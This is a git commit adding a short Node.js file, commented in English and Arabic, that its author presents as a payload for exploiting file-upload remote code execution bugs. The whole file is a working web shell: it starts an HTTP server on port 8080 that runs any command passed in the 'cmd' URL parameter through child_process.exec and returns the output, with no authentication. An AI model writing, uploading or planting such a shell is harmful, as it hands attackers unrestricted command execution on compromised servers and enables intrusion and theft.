1795214f366b92a682275b5a337ad977eff7bae2
Malek Abu liala <64085566+malekAbuliala@users.noreply.github.com>
2026-01-20 14:08:03 +0300

    Create code_file_upload_rce_type_lapx.js

---
+++ code_file_upload_rce_type_lapx.js
@@ -0,0 +1,20 @@
+// This codeing we will using with File Upload RCE Bug type and This file expresses the exploited File Upload RCE if server using .js lang ( The section follows the RCE Bug )
+// Simple Web Shell for Node.js
+
+const { exec } = require('child_process');
+const http = require('http');
+
+// بيفتح سيرفر صغير على بورت مختلف أو بيستمع لطلب معين
+http.createServer((req, res) => {
+    const url = new URL(req.url, `http://${req.headers.host}`);
+    const cmd = url.searchParams.get('cmd'); // بياخذ الأمر من الرابط ?cmd=id
+    
+    if (cmd) {
+        exec(cmd, (err, stdout, stderr) => {
+            res.writeHead(200, {'Content-Type': 'text/plain'});
+            res.end(stdout || stderr || err.message);
+        });
+    } else {
+        res.end("Node.js Shell Active. Use ?cmd=YourCommand");
+    }
+}).listen(8080); // ملاحظة: ممكن تغير البورت إذا كان 8080 مشغول
